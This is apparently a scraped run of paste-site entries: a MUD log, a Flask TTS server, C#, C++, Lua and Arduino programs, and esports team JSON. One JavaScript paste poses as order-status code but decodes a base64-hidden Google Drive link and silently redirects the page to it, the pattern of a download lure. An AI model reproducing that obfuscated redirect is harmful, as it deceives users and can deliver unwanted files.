dominates the center of the room, its only contents a fine layer of dust.
Behind the desk sits a large high-backed leather chair and on the wall a
portrait of a severe looking man glares down at all who stand before it.  A
door provides exit to the west.
Extras: [desk] [portrait severe] [feather] [chair leather] 
Exits: West  Up  


I was actually in this room (61522) when I sent savearea in the same logfile:
Log line 12502
<61522:288 Office [indoors] wiz:41 @204294>
Saved zone 288 - NEW AREA.
Saved zone_flags for zone 288 - NEW AREA.
 
But today:
go 61522
No room exists with that number.

"
g0Qyp0mN,Untitled,klassekatze,Python,Tuesday 25th of March 2025 04:18:28 PM CDT,"import re
from flask import Flask, request, Response
import requests
import json
from flask_cors import CORS
from decoder import turn_token_into_id, convert_to_audio, tokens_decoder_sync
import lameenc  # Import LAME MP3 encoder

app = Flask(__name__)
CORS(app)

DEFAULT_VOICE = ""tara""
COMPLETION_API_URL = ""http://127.0.0.1:5111/v1/completions""

def format_prompt(prompt: str, voice=DEFAULT_VOICE) -> str:
    return f""<|audio|>{voice}: {prompt}<|eot_id|>""

@app.route(""/v1/audio/speech"", methods=[""POST""])
def generate_audio_stream():
    req_data = request.get_json()
    
    text_input = req_data.get(""input"") or req_data.get(""text"")
    if not text_input:
        return {""error"": ""Missing 'text' or 'input' parameter""}, 400
    
    text_input = text_input.strip()
    print(f""Received input: {text_input}"")

    formatted_prompt = format_prompt(text_input)
    
    payload = {
        ""prompt"": formatted_prompt,
        ""max_tokens"": 2000,
        ""temperature"": 0.4,
        ""top_p"": 0.9,
        ""repetition_penalty"": 1.1,
        ""stream"": True,
    }

    def sse_to_token_generator():  # Modified to remove WAV header
        with requests.post(
            COMPLETION_API_URL,
            json=payload,
            headers={""Accept"": ""text/event-stream""},
            stream=True
        ) as response:
            
            if response.status_code != 200:
                raise ValueError(f""API Error ({response.status_code})"")

            buffer = []
            token_count = 0

            for line in response.iter_lines(decode_unicode=True):
                
                if not line.strip():  
                    continue
                
                if line.startswith(""event: ""): 
                    continue
                    
                if line.startswith(""data:""):
                    data_part = line[5:].strip()  

                    if data_part == ""[DONE]"":
                        print(""Received [DONE], stopping generation"")
                        break 

                    try:
                        event_data = json.loads(data_part)
                        
                        text = event_data[""choices""][0][""text""]
                        tokens = re.findall(r""<custom_token_\d+>"", text)
                        
                        for tok in tokens:
                            token_id = turn_token_into_id(tok, token_count)
                            if token_id is not None and token_id > 0:
                                buffer.append(token_id)
                                token_count += 1

                                if token_count % 7 == 0 and len(buffer) >= 7:
                                    multiframe = buffer[-28:]  # Keep last 28 tokens (original window size)
                                    audio_pcm = convert_to_audio(multiframe, token_count)
                                    
                                    if audio_pcm:
                                        yield audio_pcm  # Only PCM bytes now

                    except Exception as e:
                        print(f""Parsing error on '{line}': {str(e)}"")
                        continue
    
    # New MP3 wrapper generator
    def token_to_mp3_generator():
        encoder = lameenc.Encoder()
        encoder.set_bit_rate(64)          # Adjust bitrate as needed; lower is faster
        encoder.set_in_sample_rate(24000) # Matches model's sample rate
        encoder.set_channels(1)           # Mono audio from SNAC model
        encoder.silence()                 # Disable LAME debug output
        encoder.set_quality(7)            # Fastest encoding for low latency
        
        for pcm_chunk in sse_to_token_generator():  # Process each PCM chunk
            assert isinstance(pcm_chunk, bytes)
            mp3_data = encoder.encode(pcm_chunk)
            if mp3_data:
                yield bytes(mp3_data)
            
        final_mp3 = encoder.flush()       # Flush any remaining data
        if final_mp3:
            yield bytes(final_mp3)

    return Response(
        token_to_mp3_generator(),
        mimetype=""audio/mpeg"",
        headers={""Transfer-Encoding"": ""chunked""}
    )

if __name__ == ""__main__"":
    app.run(host=""0.0.0.0"", port=5000, debug=True)"
88KzJtmJ,HW 4_4_1,rukvir,C#,Tuesday 25th of March 2025 04:05:19 PM CDT,"using System;

namespace HomeWork
{
    class Program
    {

        static void Main(string[] args)
        {
            int[] numbers = { 5, 5, 5, 3, 3, 3, 3 };
            int maxNumber = numbers[0];
            int maxCount = 1;
            int currentNumber = numbers[0];
            int currentCount = 1;

            for (int i = 1; i < numbers.Length; i++)
            {
                if (numbers[i] == numbers[i - 1])
                {
                    currentCount++;
                    if (currentCount > maxCount)
                    {
                        maxCount = currentCount;
                        maxNumber = currentNumber;
                    }
                }
                else
                {
                    currentNumber = numbers[i];
                    currentCount = 1;
                }
            }

            Console.WriteLine($""Число {maxNumber} повторяется {maxCount} раза подряд"");

            Console.ReadKey();
        }
    }
}"
AfTZvPWD,Redka Compact Init ver 2.0,scottish_esquire,C++,Tuesday 25th of March 2025 04:00:25 PM CDT,"#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <map>
#include <filesystem>
#include <chrono>
#include <csignal>
#include <thread>
#include <algorithm>

namespace fs = std::filesystem;

// Конфигурация
const size_t WAL_SIZE_THRESHOLD = 512;
const std::string WAL_FILENAME = ""wal.log"";
const std::string SST_DIR = ""sst_files"";
const std::string MAIN_SST = SST_DIR + ""/main.sst"";

#pragma pack(push, 1)
struct BrixHeader {
    uint32_t version = 1;
    uint32_t entry_count;
    uint64_t index_offset;
};

struct BrixIndexEntry {
    uint32_t key_length;
    uint64_t data_offset;
    uint32_t data_length;
    uint32_t reserved = 0;
};
#pragma pack(pop)

struct WalEntry {
    std::string id;
    std::string data;
};

struct SstEntry {
    std::string id;
    std::string data;

    bool operator<(const SstEntry& other) const {
        return id < other.id;
    }
};

struct SstFileIndex {
    std::string filename;
    std::vector<std::pair<std::string, BrixIndexEntry>> sorted_index;
    BrixHeader header;
};

volatile std::sig_atomic_t g_running = 1;
std::vector<SstFileIndex> sst_indices;

// Сигналы
void signal_handler(int) {
    g_running = 0;
    std::cout << ""\nShutting down..."" << std::endl;
}

// Чтение WAL
std::vector<WalEntry> readWalFile(const std::string& filename) {
    std::vector<WalEntry> entries;
    try {
        std::ifstream walFile(filename);
        if (!walFile) throw std::runtime_error(""Can't open WAL"");

        std::string line;
        while (g_running && std::getline(walFile, line)) {
            size_t at_pos = line.find('@');
            size_t space_pos = line.find(' ', at_pos);
            if (at_pos == std::string::npos || space_pos == std::string::npos) {
                std::cerr << ""Skipping malformed WAL entry: "" << line << std::endl;
                continue;
            }
            entries.push_back({
                line.substr(at_pos + 1, space_pos - at_pos - 1),
                line
            });
        }
    } catch (const std::exception& e) {
        std::cerr << ""WAL error: "" << e.what() << std::endl;
    }
    return entries;
}

// Загрузка индекса SST
void loadSstIndex(const std::string& filename, SstFileIndex& file_index) {
    std::ifstream file(filename, std::ios::binary);
    if (!file) throw std::runtime_error(""Can't open SST: "" + filename);

    file.read(reinterpret_cast<char*>(&file_index.header), sizeof(BrixHeader));
    file.seekg(file_index.header.index_offset);

    file_index.sorted_index.reserve(file_index.header.entry_count);
    for (uint32_t i = 0; i < file_index.header.entry_count; ++i) {
        BrixIndexEntry entry;
        file.read(reinterpret_cast<char*>(&entry), sizeof(BrixIndexEntry));

        auto saved_pos = file.tellg();
        file.seekg(entry.data_offset);
        
        uint32_t data_len;
        file.read(reinterpret_cast<char*>(&data_len), sizeof(data_len));
        
        std::string key(entry.key_length, '\0');
        file.read(&key[0], entry.key_length);
        
        file_index.sorted_index.emplace_back(std::move(key), entry);
        file.seekg(saved_pos);
    }

    std::sort(file_index.sorted_index.begin(), file_index.sorted_index.end(),
        [](const auto& a, const auto& b) { return a.first < b.first; });

    file_index.filename = filename;
}

// Поиск по ключу (сначала в WAL, затем в main.sst)
std::string findKey(const std::string& key) {
    // 1. Проверяем WAL (новые данные)
    if (fs::exists(WAL_FILENAME)) {
        auto walEntries = readWalFile(WAL_FILENAME);
        for (auto it = walEntries.rbegin(); it != walEntries.rend(); ++it) {
            if (it->id == key) return it->data;
        }
    }

    // 2. Ищем в основном SST
    if (fs::exists(MAIN_SST)) {
        SstFileIndex main_index;
        loadSstIndex(MAIN_SST, main_index);
        
        auto comp = [](const auto& a, const std::string& b) { return a.first < b; };
        auto found = std::lower_bound(main_index.sorted_index.begin(), 
                                     main_index.sorted_index.end(), key, comp);
        
        if (found != main_index.sorted_index.end() && found->first == key) {
            std::ifstream file(MAIN_SST, std::ios::binary);
            file.seekg(found->second.data_offset);
            
            uint32_t data_len;
            file.read(reinterpret_cast<char*>(&data_len), sizeof(data_len));
            file.seekg(found->second.key_length, std::ios::cur);
            
            std::string data(data_len - found->second.key_length, '\0');
            file.read(&data[0], data.size());
            return data;
        }
    }

    return """";
}

// Запись SST
void writeSstFile(const std::string& filename, const std::vector<SstEntry>& entries) {
    std::ofstream sstFile(filename, std::ios::binary);
    if (!sstFile) throw std::runtime_error(""Can't create SST"");

    BrixHeader header;
    header.entry_count = entries.size();
    sstFile.write(reinterpret_cast<char*>(&header), sizeof(header));

    std::vector<BrixIndexEntry> index;
    for (const auto& entry : entries) {
        BrixIndexEntry idx;
        idx.key_length = entry.id.size();
        idx.data_offset = sstFile.tellp();

        uint32_t total_len = sizeof(uint32_t) + entry.id.size() + entry.data.size();
        sstFile.write(reinterpret_cast<char*>(&total_len), sizeof(total_len));
        sstFile.write(entry.id.data(), entry.id.size());
        sstFile.write(entry.data.data(), entry.data.size());

        idx.data_length = total_len;
        index.push_back(idx);
    }

    header.index_offset = sstFile.tellp();
    for (const auto& idx : index) {
        sstFile.write(reinterpret_cast<const char*>(&idx), sizeof(idx));
    }

    sstFile.seekp(0);
    sstFile.write(reinterpret_cast<char*>(&header), sizeof(header));
}

// Мерж всех данных в main.sst
void compactToMainSst() {
    // 1. Собираем все данные (WAL + текущий main.sst)
    std::map<std::string, std::string> latest_data;

    // Читаем WAL (новые данные)
    auto wal_entries = readWalFile(WAL_FILENAME);
    for (const auto& entry : wal_entries) {
        latest_data[entry.id] = entry.data; // Всегда перезаписываем последнюю версию
    }

    // Читаем текущий main.sst (если есть)
    if (fs::exists(MAIN_SST)) {
        SstFileIndex main_index;
        loadSstIndex(MAIN_SST, main_index);

        std::ifstream file(MAIN_SST, std::ios::binary);
        for (const auto& [key, entry] : main_index.sorted_index) {
            // Пропускаем ключи, которые уже есть в WAL (они новее)
            if (latest_data.count(key)) continue;

            file.seekg(entry.data_offset);
            uint32_t data_len;
            file.read(reinterpret_cast<char*>(&data_len), sizeof(data_len));
            file.seekg(entry.key_length, std::ios::cur);

            std::string data(data_len - entry.key_length, '\0');
            file.read(&data[0], data.size());
            latest_data[key] = data;
        }
    }

    // 2. Записываем только последние версии в новый main.sst
    std::vector<SstEntry> entries;
    for (const auto& [id, data] : latest_data) {
        entries.push_back({id, data});
    }

    // Атомарная замена файла
    std::string tmp_file = MAIN_SST + "".tmp"";
    writeSstFile(tmp_file, entries);
    fs::rename(tmp_file, MAIN_SST);

    // 3. Очищаем WAL
    std::ofstream walFile(WAL_FILENAME, std::ios::trunc);
}

// Фоновый процесс компактизации
void compactProcess() {
    std::signal(SIGINT, signal_handler);
    std::signal(SIGTERM, signal_handler);

    if (!fs::exists(SST_DIR)) fs::create_directory(SST_DIR);

    while (g_running) {
        try {
            if (fs::exists(WAL_FILENAME) && fs::file_size(WAL_FILENAME) >= WAL_SIZE_THRESHOLD) {
                compactToMainSst();
                std::cout << ""Compaction complete. Main SST updated."" << std::endl;
            }
            std::this_thread::sleep_for(std::chrono::seconds(5));
        } catch (const std::exception& e) {
            std::cerr << ""Compaction failed: "" << e.what() << std::endl;
            std::this_thread::sleep_for(std::chrono::seconds(10));
        }
    }
}

// Тест поиска
void testSearch() {
    std::string key;
    while (g_running) {
        std::cout << ""Enter key (or 'exit'): "";
        std::getline(std::cin, key);
        if (key == ""exit"") break;
        
        auto start = std::chrono::high_resolution_clock::now();
        std::string value = findKey(key);
        auto end = std::chrono::high_resolution_clock::now();
        
        std::cout << (value.empty() ? ""Not found"" : value) 
                  << "" ("" << std::chrono::duration_cast<std::chrono::microseconds>(end - start).count() 
                  << "" ms)"" << std::endl;
    }
}

int main() {
    try {
        std::thread compact_thread(compactProcess);
        testSearch();
        
        g_running = 0;
        compact_thread.join();
        return 0;
    } catch (const std::exception& e) {
        std::cerr << ""Fatal error: "" << e.what() << std::endl;
        return 1;
    }
}"
zEU3LmCq,weather-monitor.lua,ccraftersanonmoose,Lua,Tuesday 25th of March 2025 03:43:14 PM CDT,"-- Script to monitor weather and other environment details in various locations throughout world
-- planning to setup multiple systems to report into this and display throughout bases or public squares
-- something akin to a weather station, may change this setup to be minimal (1 detector, connected to one computer, w/ ender modem, maybe in a doplar like casing for looks)
-- Version History
-- version 0.1 3-24-25
-- starting with monitoring of local environment info and displaying on a monitor
-- at this stage all will be connected via networking cables
-- would like to add other systems to this can can connect via ender or wireless modems

---------------------------------------------

local detector = peripheral.wrap(""environmentDetector_0"")
local mon = peripheral.wrap(""advanced_monitor_0"")
mon.clear()

-- collect local info, this will be important so that each station can send their local info to eachother
local function getLocalInfo()
    local raining = detector.isRaining()
end

-- display local info, this may get changed into a separate script to display in bases / towns ( really anywhere you want to )
function displayLocalInfo()
    mon.setTextScale(1)
    mon.setCursorPos(1,2)
    mon.write(""Weather Station"")
    if detector.isSunny() == true then
      mon.setCursorPos(1,3)
      mon.write(""Outside:"")
      mon.setCursorPos(1,4)
     -- mon.clearLine()
      mon.write(""Sunny     "")
        else if detector.isRaining() == true then
        mon.setCursorPos(1,3)
        mon.write(""Outside:"")
        mon.setCursorPos(1,4)
      --  mon.clearLine()
        mon.write(""Raining    "")
            else if detector.isThunder() == true then
            mon.setCursorPos(1,3)
            mon.write(""Outside:"")
             mon.setCursorPos(1,4)
            --  mon.clearLine()
            mon.write(""Thunder Storm"")
            end 
        end
    end
end

while true do
    getLocalInfo()
    displayLocalInfo()
end"
KJiJ3Zxc,A.R.D.F. Fox hunting Arduino UNO,yo9gjx,C++,Tuesday 25th of March 2025 03:26:54 PM CDT,"const int relayPin = 2;
const int audioPin = 3;
const int dotDuration = 130; // Durata punctului în milisecunde
const int dashDuration = 3 * dotDuration;

void setup() {
  pinMode(relayPin, OUTPUT);
  pinMode(audioPin, OUTPUT);
}

void loop() {
  String cuvinte[] = {""MOE"", ""MOI"", ""MOS"", ""MOH"", ""MO5""};
  
  for (int i = 0; i < 5; i++) {                   // Parcurge fiecare cuvânt
    for (int j = 0; j < 15; j++) {                // Repetă de 15 ori
      transmiteMorse(cuvinte[i]);                 // Transmite cuvântul
    }
  }
  
  delay(5000); // Pauză de 5 secunde după fiecare ciclu complet
}

void transmiteMorse(String cuvant) {
  for (int i = 0; i < cuvant.length(); i++) {
    char litera = cuvant.charAt(i);
    simbolMorse(litera);
    
    // Spațiu între litere (3 unități)
    if (i < cuvant.length() - 1) {
      delay(3 * dotDuration);
    }
  }
  // Spațiu între cuvinte (7 unități)
  delay(7 * dotDuration);
}

void simbolMorse(char caracter) {
  String cod;
  switch (caracter) {
    case 'M': cod = ""--""; break;
    case 'O': cod = ""---""; break;
    case 'E': cod = "".""; break;
    case 'I': cod = ""..""; break;
    case 'S': cod = ""...""; break;
    case 'H': cod = ""....""; break;
    case '5': cod = "".....""; break;
    default: return;
  }

  for (int i = 0; i < cod.length(); i++) {
    digitalWrite(relayPin, HIGH);
    tone(audioPin, 1000); // Generează ton de 1000Hz
    
    if (cod[i] == '.') {
      delay(dotDuration);
    } else {
      delay(dashDuration);
    }
    
    digitalWrite(relayPin, LOW);
    noTone(audioPin);
    
    // Spațiu între simboluri (1 unitate)
    if (i < cod.length() - 1) delay(dotDuration);
  }
}
"
Z9R7ZphL,wrl s2 teams (no logo),matp93,JSON,Tuesday 25th of March 2025 02:37:24 PM CDT,"[
    {
        ""Id"": ""Shorkies"",
        ""Name"": ""Shorkies"",
        ""ShortName"": ""SHRK"",
        ""Players"": [
            {
                ""Name"": ""Vingummi101"",
                ""AccountId"": ""7efb8fcc-b664-44ec-a3c8-02b5e377539c""
            },
            {
                ""Name"": ""SF-lnko"",
                ""AccountId"": ""d9f06d37-3300-4468-97b2-5de8404e0e92""
            }
        ]
    },
    {
        ""Id"": ""Apex Predators"",
        ""Name"": ""Apex Predators"",
        ""ShortName"": ""APEX"",
        ""Players"": [
            {
                ""Name"": ""Liz.TM"",
                ""AccountId"": ""b49ae4fe-75e9-4a5c-a4b6-ce0d06c5c772""
            },
            {
                ""Name"": ""CatBagasm"",
                ""AccountId"": ""b89e8368-945b-457e-ab88-d9250f75eabd""
            }
        ]
    },
    {
        ""Id"": ""Lunaena"",
        ""Name"": ""Lunaena"",
        ""ShortName"": ""LUA"",
        ""Players"": [
            {
                ""Name"": ""deluluna_"",
                ""AccountId"": ""d3557ada-6d0c-40be-9208-8587d9293dff""
            },
            {
                ""Name"": ""Seliaste"",
                ""AccountId"": ""5dafce24-de74-4d58-bdf8-68d9c6c65387""
            }
        ]
    },
    {
        ""Id"": ""Ferox Industries"",
        ""Name"": ""Ferox Industries"",
        ""ShortName"": ""FERX"",
        ""Players"": [
            {
                ""Name"": ""Neoranto"",
                ""AccountId"": ""ff66a79d-53d8-4cfa-8c0f-779463b5acf7""
            },
            {
                ""Name"": ""prowe.ss"",
                ""AccountId"": ""4ff4f9e1-7360-4000-bf88-aef578b05ffe""
            },
            {
                ""Name"": ""chloe.iwnl"",
                ""AccountId"": ""8542c707-6300-4b4c-ae78-58406469e064""
            }
        ]
    },
    {
        ""Id"": ""STPG"",
        ""Name"": ""STPG"",
        ""ShortName"": ""STPG"",
        ""Players"": [
            {
                ""Name"": ""Cinnamon.Crunch"",
                ""AccountId"": ""1dc58d03-3b58-4348-b793-e6f1647f0d80""
            },
            {
                ""Name"": ""Hydro0_CS"",
                ""AccountId"": ""bdead8db-2d34-4788-b7ff-64125d2f6bdf""
            }
        ]
    },
    {
        ""Id"": ""Molotov Gaming"",
        ""Name"": ""Molotov Gaming"",
        ""ShortName"": ""MLTV"",
        ""Players"": [
            {
                ""Name"": ""Anderin_tm"",
                ""AccountId"": ""db7e8268-b434-4f51-9038-4dd15202550f""
            },
            {
                ""Name"": ""cozzer04"",
                ""AccountId"": ""1683525a-bcfb-41ee-9aba-f6cafca4a27f""
            },
            {
				""Name"": ""Mariina"",
				""AccountId"": ""711036bf-d90b-4fa4-9be5-964eb3912256""
			}
        ]
    },
    {
        ""Id"": ""Rice Buns"",
        ""Name"": ""Rice Buns"",
        ""ShortName"": ""RCBN"",
        ""Players"": [
            {
                ""Name"": ""talja1998"",
                ""AccountId"": ""4aa474df-f82a-4206-86c6-210cc06d2ccf""
            },
            {
                ""Name"": ""Digitalada"",
                ""AccountId"": ""43654d38-922d-4546-8b2a-3cc84e912cdd""
            }
        ]
    },
    {
        ""Id"": ""SussyBunnies"",
        ""Name"": ""SussyBunnies"",
        ""ShortName"": ""SUBS"",
        ""Players"": [
            {
                ""Name"": ""LongBunny"",
                ""AccountId"": ""bda58d05-f462-485b-8011-6a34ed8b77f5""
            },
            {
                ""Name"": ""hippiegirl13"",
                ""AccountId"": ""bc88a3aa-a118-494a-aed6-ea7687d3db7e""
            }
        ]
    },
    {
        ""Id"": ""MEOW_"",
        ""Name"": ""MEOW_"",
        ""ShortName"": ""MEOW"",
        ""Players"": [
            {
                ""Name"": ""ya___"",
                ""AccountId"": ""2aae8132-2f40-40f3-9808-55bd9a3e56bf""
            },
            {
                ""Name"": ""ZaraStocher"",
                ""AccountId"": ""7789c1c5-75b6-484e-bbee-11f914865247""
            },
			{
				""Name"": ""Lina_Kitty"",
				""AccountId"": ""497403f2-4b50-4424-89a9-b81dcb34a6c0""
			}
        ]
    },
    {
        ""Id"": ""Big Bonkers"",
        ""Name"": ""Big Bonkers"",
        ""ShortName"": ""BONK"",
        ""Players"": [
            {
                ""Name"": ""SneakyAnnie"",
                ""AccountId"": ""ce414ab7-2193-4613-a85d-317dbcbe480c""
            },
			{
                ""Name"": ""Majijej"",
                ""AccountId"": ""bfcf62ff-0f9e-40aa-b924-11b9c70b8a09""
            },
            {
                ""Name"": ""leabdd"",
                ""AccountId"": ""34050419-362c-41a7-afcd-f8e2b9e753f3""
            }
        ]
    },
    {
        ""Id"": ""EQNX"",
        ""Name"": ""EQNX"",
        ""ShortName"": ""EQNX"",
        ""Players"": [
            {
                ""Name"": ""Shorty_GrayTM"",
                ""AccountId"": ""c210e96e-35be-4cb6-9224-0f73cab9dab5""
            },
            {
                ""Name"": ""ieva."",
                ""AccountId"": ""43a1db59-380c-4d2f-8a72-9fbfbe52c749""
            }
        ]
    }
]"
arhPqtVY,wrl s2 teams,matp93,JSON,Tuesday 25th of March 2025 02:33:18 PM CDT,"[
    {
        ""Id"": ""Shorkies"",
        ""Name"": ""Shorkies"",
        ""ShortName"": ""SHRK"",
        ""LogoUrl"": ""https://i.ibb.co/PGQjNPYz/Shorkies.png"",
        ""Sign2x3Url"": ""https://i.ibb.co/PGQjNPYz/Shorkies.png"",
        ""Sign16x9Url"": ""https://i.ibb.co/PGQjNPYz/Shorkies.png"",
        ""Sign64x10Url"": ""https://i.ibb.co/PGQjNPYz/Shorkies.png"",
        ""Players"": [
            {
                ""Name"": ""Vingummi101"",
                ""AccountId"": ""7efb8fcc-b664-44ec-a3c8-02b5e377539c""
            },
            {
                ""Name"": ""SF-lnko"",
                ""AccountId"": ""d9f06d37-3300-4468-97b2-5de8404e0e92""
            }
        ]
    },
    {
        ""Id"": ""Apex Predators"",
        ""Name"": ""Apex Predators"",
        ""ShortName"": ""APEX"",
        ""LogoUrl"": ""https://i.ibb.co/LBF7T3L/Apex-Predators.png"",
        ""Sign2x3Url"": ""https://i.ibb.co/LBF7T3L/Apex-Predators.png"",
        ""Sign16x9Url"": ""https://i.ibb.co/LBF7T3L/Apex-Predators.png"",
        ""Sign64x10Url"": ""https://i.ibb.co/LBF7T3L/Apex-Predators.png"",
        ""Players"": [
            {
                ""Name"": ""Liz.TM"",
                ""AccountId"": ""b49ae4fe-75e9-4a5c-a4b6-ce0d06c5c772""
            },
            {
                ""Name"": ""CatBagasm"",
                ""AccountId"": ""b89e8368-945b-457e-ab88-d9250f75eabd""
            }
        ]
    },
    {
        ""Id"": ""Lunaena"",
        ""Name"": ""Lunaena"",
        ""ShortName"": ""LUA"",
        ""Players"": [
            {
                ""Name"": ""deluluna_"",
                ""AccountId"": ""d3557ada-6d0c-40be-9208-8587d9293dff""
            },
            {
                ""Name"": ""Seliaste"",
                ""AccountId"": ""5dafce24-de74-4d58-bdf8-68d9c6c65387""
            }
        ]
    },
    {
        ""Id"": ""Ferox Industries"",
        ""Name"": ""Ferox Industries"",
        ""ShortName"": ""FERX"",
        ""LogoUrl"": ""https://i.ibb.co/RTDypnVb/Ferox-Industries.png"",
        ""Sign2x3Url"": ""https://i.ibb.co/RTDypnVb/Ferox-Industries.png"",
        ""Sign16x9Url"": ""https://i.ibb.co/RTDypnVb/Ferox-Industries.png"",
        ""Sign64x10Url"": ""https://i.ibb.co/RTDypnVb/Ferox-Industries.png"",
        ""Players"": [
            {
                ""Name"": ""Neoranto"",
                ""AccountId"": ""ff66a79d-53d8-4cfa-8c0f-779463b5acf7""
            },
            {
                ""Name"": ""prowe.ss"",
                ""AccountId"": ""4ff4f9e1-7360-4000-bf88-aef578b05ffe""
            },
            {
                ""Name"": ""chloe.iwnl"",
                ""AccountId"": ""8542c707-6300-4b4c-ae78-58406469e064""
            }
        ]
    },
    {
        ""Id"": ""STPG"",
        ""Name"": ""STPG"",
        ""ShortName"": ""STPG"",
        ""Players"": [
            {
                ""Name"": ""Cinnamon.Crunch"",
                ""AccountId"": ""1dc58d03-3b58-4348-b793-e6f1647f0d80""
            },
            {
                ""Name"": ""Hydro0_CS"",
                ""AccountId"": ""bdead8db-2d34-4788-b7ff-64125d2f6bdf""
            }
        ]
    },
    {
        ""Id"": ""Molotov Gaming"",
        ""Name"": ""Molotov Gaming"",
        ""ShortName"": ""MLTV"",
        ""LogoUrl"": ""https://i.ibb.co/nNJMFpwG/Molotov-Gaming.png"",
        ""Sign2x3Url"": ""https://i.ibb.co/nNJMFpwG/Molotov-Gaming.png"",
        ""Sign16x9Url"": ""https://i.ibb.co/nNJMFpwG/Molotov-Gaming.png"",
        ""Sign64x10Url"": ""https://i.ibb.co/nNJMFpwG/Molotov-Gaming.png"",
        ""Players"": [
            {
                ""Name"": ""Anderin_tm"",
                ""AccountId"": ""db7e8268-b434-4f51-9038-4dd15202550f""
            },
            {
                ""Name"": ""cozzer04"",
                ""AccountId"": ""1683525a-bcfb-41ee-9aba-f6cafca4a27f""
            },
            {
				""Name"": ""Mariina"",
				""AccountId"": ""711036bf-d90b-4fa4-9be5-964eb3912256""
			}
        ]
    },
    {
        ""Id"": ""Rice Buns"",
        ""Name"": ""Rice Buns"",
        ""ShortName"": ""RCBN"",
        ""LogoUrl"": ""https://i.ibb.co/SDnQRJjJ/Rice-Buns.png"",
        ""Sign2x3Url"": ""https://i.ibb.co/SDnQRJjJ/Rice-Buns.png"",
        ""Sign16x9Url"": ""https://i.ibb.co/SDnQRJjJ/Rice-Buns.png"",
        ""Sign64x10Url"": ""https://i.ibb.co/SDnQRJjJ/Rice-Buns.png"",
        ""Players"": [
            {
                ""Name"": ""talja1998"",
                ""AccountId"": ""4aa474df-f82a-4206-86c6-210cc06d2ccf""
            },
            {
                ""Name"": ""Digitalada"",
                ""AccountId"": ""43654d38-922d-4546-8b2a-3cc84e912cdd""
            }
        ]
    },
    {
        ""Id"": ""SussyBunnies"",
        ""Name"": ""SussyBunnies"",
        ""ShortName"": ""SUBS"",
        ""LogoUrl"": ""https://i.ibb.co/Qj9175pF/Sussy-Bunnies.png"",
        ""Sign2x3Url"": ""https://i.ibb.co/Qj9175pF/Sussy-Bunnies.png"",
        ""Sign16x9Url"": ""https://i.ibb.co/Qj9175pF/Sussy-Bunnies.png"",
        ""Sign64x10Url"": ""https://i.ibb.co/Qj9175pF/Sussy-Bunnies.png"",
        ""Players"": [
            {
                ""Name"": ""LongBunny"",
                ""AccountId"": ""bda58d05-f462-485b-8011-6a34ed8b77f5""
            },
            {
                ""Name"": ""hippiegirl13"",
                ""AccountId"": ""bc88a3aa-a118-494a-aed6-ea7687d3db7e""
            }
        ]
    },
    {
        ""Id"": ""MEOW_"",
        ""Name"": ""MEOW_"",
        ""ShortName"": ""MEOW"",
        ""LogoUrl"": ""https://i.ibb.co/wNQYSMmJ/mewo.png"",
        ""Sign2x3Url"": ""https://i.ibb.co/wNQYSMmJ/mewo.png"",
        ""Sign16x9Url"": ""https://i.ibb.co/wNQYSMmJ/mewo.png"",
        ""Sign64x10Url"": ""https://i.ibb.co/wNQYSMmJ/mewo.png"",
        ""Players"": [
            {
                ""Name"": ""ya___"",
                ""AccountId"": ""2aae8132-2f40-40f3-9808-55bd9a3e56bf""
            },
            {
                ""Name"": ""ZaraStocher"",
                ""AccountId"": ""7789c1c5-75b6-484e-bbee-11f914865247""
            },
			{
				""Name"": ""Lina_Kitty"",
				""AccountId"": ""497403f2-4b50-4424-89a9-b81dcb34a6c0""
			}
        ]
    },
    {
        ""Id"": ""Big Bonkers"",
        ""Name"": ""Big Bonkers"",
        ""ShortName"": ""BONK"",
        ""LogoUrl"": ""https://i.ibb.co/YFBNCQ7T/BIGBONKERSLOGO.png"",
        ""Sign2x3Url"": ""https://i.ibb.co/YFBNCQ7T/BIGBONKERSLOGO.png"",
        ""Sign16x9Url"": ""https://i.ibb.co/YFBNCQ7T/BIGBONKERSLOGO.png"",
        ""Sign64x10Url"": ""https://i.ibb.co/YFBNCQ7T/BIGBONKERSLOGO.png"",
        ""Players"": [
            {
                ""Name"": ""SneakyAnnie"",
                ""AccountId"": ""ce414ab7-2193-4613-a85d-317dbcbe480c""
            },
			{
                ""Name"": ""Majijej"",
                ""AccountId"": ""bfcf62ff-0f9e-40aa-b924-11b9c70b8a09""
            },
            {
                ""Name"": ""leabdd"",
                ""AccountId"": ""34050419-362c-41a7-afcd-f8e2b9e753f3""
            }
        ]
    },
    {
        ""Id"": ""EQNX"",
        ""Name"": ""EQNX"",
        ""ShortName"": ""EQNX"",
        ""LogoUrl"": ""https://i.ibb.co/HTh9d53F/EQNX.png"",
        ""Sign2x3Url"": ""https://i.ibb.co/HTh9d53F/EQNX.png"",
        ""Sign16x9Url"": ""https://i.ibb.co/HTh9d53F/EQNX.png"",
        ""Sign64x10Url"": ""https://i.ibb.co/HTh9d53F/EQNX.png"",
        ""Players"": [
            {
                ""Name"": ""Shorty_GrayTM"",
                ""AccountId"": ""c210e96e-35be-4cb6-9224-0f73cab9dab5""
            },
            {
                ""Name"": ""ieva."",
                ""AccountId"": ""43a1db59-380c-4d2f-8a72-9fbfbe52c749""
            }
        ]
    }
]"
iPxYLqiQ,Untitled,hubertzoo90,JavaScript,Tuesday 25th of March 2025 02:20:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/488/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jBsRBC7c,Untitled,hubertzoo90,JavaScript,Tuesday 25th of March 2025 02:08:22 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/756/status"";
